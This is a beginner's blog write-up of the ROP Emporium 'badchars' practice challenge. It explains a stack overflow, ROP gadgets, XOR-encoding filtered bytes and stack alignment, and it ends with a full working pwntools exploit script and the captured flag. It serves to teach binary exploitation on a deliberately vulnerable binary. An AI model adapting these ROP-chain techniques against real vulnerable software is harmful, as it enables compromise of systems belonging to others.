---
title: "Upsolving Suite: Pwn Progress"
date: 2023-08-14T17:31:15-05:00
tags: ["2023", "upsolve", "pwn"]
summary: My first time attempting real pwn.
---

So I'll just preface this post with a bit of a disclaimer, this isn't actually upsolving. I'll just be doing a writeup over `badchars` from the great site [ROP Emporium](https://ropemporium.com/). But, this is still my first time actually doing binary exploitation, so I'll try to be as thorough as possible for people in the same position. Do note this writeup assumes basic knowledge of assembly and the stack.

## Preface
> An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
> Find a way to deal with this and craft your exploit.

I'll be doing the [`x86_64` challenge](https://ropemporium.com/binary/badchars.zip) for today.

So here's a basic rundown of the challenge:

We have a binary that takes input from the user. There's a simple basic overflow, where `0x200` bytes of input are read but only `0x20` are allocated for the buffer.

Our goal is to call a function `print_file`, with our own argument (in this case `'flag.txt'`). However, there are two catches:
1. The string `flag.txt` doesn't exist in the binary by default, so we somehow need to write it into memory.
2. The crux of the challenge, there are a few banned characters that get replaced when we try to pass them in as input.

Alright, so let's get started. Though this challenge is meant to build on the last challenge, `write4`, where you just have to write `flag.txt` to memory, I'll go over this challenge from the very beginning.

## Binary Analysis
First let's take a look at the binary itself. There's two parts here, the actual executable that we run and the `.so` library that gets loaded by the executable. 

In the actual executable, we have a pretty simple `main` function:
![main() function that calls pwnme()](/img/writeups/2023/upsolving/pwn-progress-2/main.png)

Now this `pwnme` function is inside the `libbadchars.so` library, so we need to look in there to see:
![pwnme() decompilation](/img/writeups/2023/upsolving/pwn-progress-2/pwnme.png)

We see that it reads in `0x200` bytes into a `var_28`, a buffer that only allocates `0x20` bytes. This is the simple overflow that I described earlier. 

After reading in those bytes, it loops through every byte we input, checks if any of them are `'x', 'g', 'a', or '.'`, and replaces them with the byte `0xeb` if they are.

So how do we go about exploiting this binary?

## Rop rop rop your boat
Well, first thing's first, let's see what we can do with the buffer overflow.

I'll run through this section in `gdb` (with `gef`). Thankfully PIE is disabled so the addresses should be the same for everyone.

Anyway, here's what the stack looks like right before the `read` call:
```text
0x007fffffffda50│+0x0000: 0x00000000000006f0     ← $rsp
0x007fffffffda58│+0x0008: 0x007fffffffde39  →  0x537717b1438594eb
0x007fffffffda60│+0x0010: 0x007ffff7fc1000  →  0x00010102464c457f
0x007fffffffda68│+0x0018: 0x0000010101000000
0x007fffffffda70│+0x0020: 0x0000000000000000     ← $rax, $rsi
0x007fffffffda78│+0x0028: 0x0000000000000000
0x007fffffffda80│+0x0030: 0x0000000000000000
0x007fffffffda88│+0x0038: 0x0000000000000000
0x007fffffffda90│+0x0040: 0x00007fffffffdaa0
0x007fffffffda98│+0x0048: 0x0000000000400610
```
And here's what it looks like right before the `ret` of the `pwnme` function (assuming we don't overwrite anything):
```text
0x007fffffffda98│+0x0000: 0x00000000400610  →  <main+9> mov eax, 0x0     ← $rsp
0x007fffffffdaa0│+0x0008: 0x0000000000000001
0x007fffffffdaa8│+0x0010: 0x007ffff7a01d90  →  <__libc_start_call_main+128> mov edi, eax
0x007fffffffdab0│+0x0018: 0x0000000000000000
0x007fffffffdab8│+0x0020: 0x00000000400607  →  <main+0> push rbp
0x007fffffffdac0│+0x0028: 0x00000001ffffdba0
0x007fffffffdac8│+0x0030: 0x007fffffffdbb8  →  0x007fffffffde5b 
0x007fffffffdad0│+0x0038: 0x0000000000000000
```
When the `ret` instruction is run, the most important thing it's doing is `pop $rip`. The value at the top of the stack is popped into the instruction pointer, jumping to that address. There's some more that occurs but only this jump is important.

Normally, this pointer would just resume whatever function call was occurring before. But we can change that. The way [ROP (Return-oriented-programming)](https://en.wikipedia.org/wiki/Return-oriented_programming) works is by making the `ret` instruction jump to a different function than expected. 

If we can overwrite the bytes `0x28` above where our input is read, at `0x007fffffffda98`, we can overwrite the address that `ret` will return to.

For example, here's how we could jump back to `pwnme` after the `ret`:
```py
from pwn import *

elf = ELF('./badchars')
p = process('./badchars')

payload = b'A' * 0x28 # 0x28 bytes of padding
payload += p64(elf.symbols['pwnme']) # overwrite the return address

p.sendline(payload)
p.interactive()
```

This will overwrite the return address with the beginning of the `pwnme` function, so it will just run the function again.

But we need to actually do something useful, including writing to memory...

## Gah-dgets
First of all, let's figure out what we can do with an arbitrary jump. 

In ROP, most of the time you'll be using gadgets. These are small pieces of code that come from pre-existing functions in the binary. They're usually just a few instructions long, and they're useful for doing things like writing or reading memory. 

Additionally, these gadgets usually end with another `ret` or `jmp` instruction, so that they can be chained together.

We can use the tool [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) to find useful gadgets in the binary:
```bash
ROPgadget --binary badchars --ropchain
```
```text
Gadgets information
============================================================
[lots of gadgets here]

Unique gadgets found: 83

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x400634 mov qword ptr [r13], r12 ; ret
        [+] Gadget found: 0x40069e pop r13 ; pop r14 ; pop r15 ; ret
        [+] Gadget found: 0x40069c pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
        [-] Can't find the 'xor r12, r12' gadget. Try with another 'mov [reg], reg'

        [-] Can't find the 'mov qword ptr [r64], r64' gadget
```

There's a lot of gadgets present, but we only need a few to do what we want. First of all, we need to write to memory. We can use the `mov qword ptr [r13], r12 ; ret` gadget to do this. This gadget will write the qword value (8 bytes) in `r12` to the address in `r13`.

Additionally, to load values into `r12` and `r13`, we have the gadget at `0x40069c`, that pops values into `r12`, `r13`, `r14`, and `r15`. We just need to fill `r14` and `r15` with garbage values, since we don't need them.

### Read-only, not write-only
But where do we write this data anyway? We know that we need to write `flag.txt` somewhere so that it can be called by `print_file`, but where exactly?

If we try to write over the existing `"nonexistent"` string inside the binary, we'll run into a problem:
![the string is inside .rodata](/img/writeups/2023/upsolving/pwn-progress-2/rodata.png)

The string is inside the `.rodata` section, which is read-only, so we can't write to it. But thankfully, the actual `.data` section is empty, and we can actually write to it.
![We can overwrite .data](/img/writeups/2023/upsolving/pwn-progress-2/data.png)

So we'll just put our string there.

Alright, so here's what our exploit is looking like currently:
```py
from pwn import *

elf = ELF('./badchars')
p = process('./badchars')

payload = b'A' * 0x28 # 0x28 bytes of padding

payload += p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += b'flag.txt' # r12
payload += p64(0x0601028) # r13
payload += b'AAAAAAAA' # r14
payload += b'AAAAAAAA' # r15

payload += p64(0x400634) # mov qword ptr [r13], r12 ; ret
```

But of course, this won't work. We still have banned characters inside the `flag.txt` string, so we need to change those somehow.

## I wonder who left these here...
Looking at the other gadgets, we need something that is also able to modify memory. Well, thankfully, the author of the challenge left use some very useful gadgets in the binary - including the `mov` gadget we used earlier!
![list of useful gadgets](/img/writeups/2023/upsolving/pwn-progress-2/usefulgadgets.png)

Well, there's a lot to choose from here, but let's just use the `xor byte ptr [r15], r14b ; ret` gadget for simplicity. 

Now, we can change our exploit to use this gadget to modify the banned characters:
- First, we choose a fixed value to `xor` the banned characters by (say 100)
- Then, we load in the `flag.txt` string with the banned characters already `xor`ed
- Next, we `xor` each banned character with the fixed value again, to get the original banned character back
- Finally, we can call `print_file` with the `flag.txt` string

### Wait, calling?
Actually, we also never covered how to call the final function with our string anyway. 

Well, let's take a look inside `gdb` and see how arguments are passed to functions. Here's an example of a `puts` inside the `pwnme` function:
![puts@plt ($rdi, $rsi, $rdx)](/img/writeups/2023/upsolving/pwn-progress-2/putscall.png)

As you can see, the first argument to the function is passed in `rdi`, the second in `rsi`, and the third in `rdx`. 

That means to call `print_file` with our `flag.txt` string, we need to load the address of the string into `rdi` and then call `print_file`.

Using ROPgadget again, we can see that thankfully there's a simple `pop rdi` gadget:
```
0x00000000004006a3 : pop rdi ; ret
```

So all we need to do is load the address of the string onto the stack, use the `pop rdi` gadget, then `ret` to the start of `print_file`.

That's all the parts we need. But before we write the exploit we need to keep in mind two things:
1. The gadget for writing to memory is a `qword ptr`, but the `xor` gadget only uses a `byte ptr`. This means we need to `xor` each banned character individually.
2. Additionally, the bad chars can't be present at any part of the payload, *including* the addresses we use.

Here's a quick draft of the exploit, I've created a helper function to make things easier:

filename=solve.py
```py
from pwn import *

elf = ELF('./badchars')
p = process('./badchars')

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

CHUNKSIZE = 8
r = 100
def write_str(target, str, badchars=[]):
    payload = b''
    chunks = [str[i:i+CHUNKSIZE].encode() for i in range(0, len(str), CHUNKSIZE)]

    for i, chunk in enumerate(chunks):
        rchunk = b''
        r_indexes = []
        for j, c in enumerate(chunk):
            if chr(c) in badchars: # keep track of which indexes we need to xor later
                rchunk += bytes([c ^ r])
                r_indexes.append(j)
            else:
                rchunk += bytes([c])

        # 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
        payload += p64(0x40069c)
        payload += rchunk                       # r12
        payload += p64(target + i * CHUNKSIZE)  # r13
        payload += b'\x00' * 8                  # r14
        payload += b'\x00' * 8                  # r15

        # 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
        payload += p64(0x400634)

        # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
        # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
        for j in r_indexes:
            payload += p64(0x4006a0)
            payload += bytes([r]).ljust(8, b'\x00')     # r14
            payload += p64(target + i * CHUNKSIZE + j)  # r15

            payload += p64(0x400628)                    # xor gadget

    return payload

payload = b'A' * 0x28
payload += write_str(elf.symbols['__data_start'], 'flag.txt', ['.', 'x', 'g', 'a'])

payload += p64(0x4006a3) # pop rdi ; ret
payload += p64(elf.symbols['__data_start'])

payload += p64(elf.symbols['print_file'])
# dump payload to local file or send to remote
```

However, if we try to run this, it fails. We get a segfault, and no flag is printed. That's weird, what's going on?

### Step by step
Running the payload inside `gdb` (`run < payload`), we can see where our ropchain starts:
![breakpoint at 0x7ffff7c00a06 <pwnme+268>      ret](/img/writeups/2023/upsolving/pwn-progress-2/ropchainstart.png)

We can see that after the `ret`, we'll be inside the `pop r12; pop r13; ...` gadget. This is where we load the `xor`ed string into memory.

Stepping through, eventually we reach our `xor` gadgets:
![gadget at 0x400628 <usefulGadgets+0> xor    BYTE PTR [r15], r14b](/img/writeups/2023/upsolving/pwn-progress-2/ropchainxorstart.png)

You can see that the stack has pointers to `data_start+x`, indicating which characters we need to `xor`. However, the last gadget seems off:
![last xor gadget has address at 0x000000006010eb instead of data_start + x](/img/writeups/2023/upsolving/pwn-progress-2/ropchainbadxor.png)

It seems to be pointing too far ahead? What's going on here?

Well, remember part 2 of the things to keep in mind? The bad characters can't be present at any part of the payload, *including* the addresses we use.

It turns out that the position of `x` in `flag.txt` **just happens to be at such a bad address**. So when we try to load in its address to be `xor`ed, the bad character will get replaced with `0xeb`, and the address will be wrong.

To fix this, we can just shift the string over by one character, since neither of the `t`s are banned. So instead of writing to `data_start`, we'll write to `data_start + 1`.

Unfortunately with this issue fixed, we *still* can't get the flag.

### Oh right this is x64
If you've done other parts of the ROP Emporium challenges, or just any x64 ROP in general, you'll probably know what the issue is.

Because the binary is in x64, some functions require the stack to be 16-byte aligned. Unfortunately, because we've been messing with the stack so much, our payload unaligns the stack, and the `print_file` function fails.

To fix this, we can just plug a simple `ret` gadget into the end of our payload. This gadget:
```
0x00000000004004ee : ret
```
will work just fine.

### Final solution
Here's the final exploit:

filename=solve.py
```py
from pwn import *

elf = ELF('./badchars')
p = process('./badchars')

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

CHUNKSIZE = 8
r = 100
def write_str(target, str, badchars=[]):
    payload = b''
    chunks = [str[i:i+CHUNKSIZE].encode() for i in range(0, len(str), CHUNKSIZE)]

    for i, chunk in enumerate(chunks):
        rchunk = b''
        r_indexes = []
        for j, c in enumerate(chunk):
            if chr(c) in badchars: # keep track of which indexes we need to xor later
                rchunk += bytes([c ^ r])
                r_indexes.append(j)
            else:
                rchunk += bytes([c])

        # 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
        payload += p64(0x40069c)
        payload += rchunk                       # r12
        payload += p64(target + i * CHUNKSIZE)  # r13
        payload += b'\x00' * 8                  # r14
        payload += b'\x00' * 8                  # r15

        # 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
        payload += p64(0x400634)

        # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
        # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
        for j in r_indexes:
            payload += p64(0x4006a0)
            payload += bytes([r]).ljust(8, b'\x00')     # r14
            payload += p64(target + i * CHUNKSIZE + j)  # r15

            payload += p64(0x400628)                    # xor gadget

    return payload

payload = b'A' * 0x28
payload += write_str(elf.symbols['__data_start'] + 1, 'flag.txt', ['.', 'x', 'g', 'a'])

payload += p64(0x4006a3) # pop rdi ; ret
payload += p64(elf.symbols['__data_start'] + 1)

payload += p64(0x4004ee) # empty ret gadget to align stack
payload += p64(elf.symbols['print_file'])

p.sendline(payload)
p.interactive()
```
And here's the flag:
```text
$ python3 solve.py
[+] Starting local process './badchars': pid 3674
[*] Switching to interactive mode
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
GGs!

## Conclusion
This was a great introductory challenge, and probably my first real pwn challenge that wasn't simple buffer overflow. I never really understood pwn much before, but after a while of learning assembly through reverse engineering, it seems pretty fun! I'll definitely be doing more of these challenges in the future.

Originally I wanted to make a writeup for the other ROPEmporium challenges before this, but I felt like this one was a good way to demonstrate of all the previous skills needed.